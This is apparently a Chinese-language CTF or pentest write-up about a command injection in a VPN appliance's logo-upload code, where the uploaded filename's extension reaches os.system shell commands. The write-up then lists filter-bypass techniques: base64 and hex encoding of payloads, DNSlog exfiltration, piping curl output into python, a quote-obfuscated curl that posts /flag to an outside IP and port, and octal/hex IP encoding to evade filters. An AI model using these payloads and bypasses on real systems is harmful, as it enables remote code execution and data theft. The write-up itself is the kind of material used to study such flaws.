### 源码
```php
if file_src == "vpn_logo_upload":
    data = request.files.vpn_logo
    filename = data.filename
    if data.file:
        file_ext = os.path.splitext(filename)[1]
        output_path = "/usr/vtm/var/www/html/vpn/upload/" + "vpn_logo" + file_ext
        bak_tag = False
        bak_file_path = output_path + ".bak"
        if os.path.exists(output_path):
            cmd = "mv -f " + output_path + " " + bak_file_path
            os.system(cmd)
            bak_tag = True
        write_file(filename, data.file, output_path)
        file_size = os.path.getsize(output_path)
        file_type = mimetypes.guess_type(output_path)
        del_cmd = "rm -f " + output_path
        if file_type[0] != "image/jpeg" and file_type[0] != "image/png" and file_type[0] != "image/gif":
            result = {"return": -2, "reason": file_type[0]}
            os.system(del_cmd)
        elif file_size < file_size_1M:
            result["data"]["new_name"] = "vpn_logo" + file_ext
        else:
            result = {"return": -2, "reason": "file is too large"}
            os.system(del_cmd)
            if bak_tag:
                bak_cmd = "mv -f " + bak_file_path + " " + output_path
                os.system(bak_cmd)
```
### 编码绕过
**没啥好说的，也可以通过dnslog进行外带**
linux有一些编码工具,base64,16进制
base64,并不是很好用,因为base64有时候会出现`/`字符
```
编码: echo "hello" | base64 
解码: echo "aGVsbG8K" | base64 -d
```
16进制
```
编码: echo "hello" | xxd -p
解码: echo "68656c6c6f0a" | xxd -r -p
```
优缺点: 存在字符长度问题，当然如果是无法连接外网的时候，这个还是能写shell的
**本地起一个Web服务**
```python
python3 -m SimpleHttpServer
```
### 远程绕过
命令外带，`curl 16禁止ip | python`
```bash
cat /flag | c''url -d @- -X POST 10.22.236.45:23333
```
也可以使用十六进制
```
十进制 ---||||||> 十六进制 ---||||||> 八进制 然后在访问时 指定协议然后加个0

http://0[八进制] 比如 115.239.210.26 首先用.分割数字 115 239 210 26 然后选择10进制转换16进制！

(要用0来表示前缀，可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样！)

首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a  然后把 73efd21a 这十六进制一起转换成8进制！

结果：16373751032

然后指定协议 http:// 用0表示前缀 加上结果 链接：

http://0016373751032
```
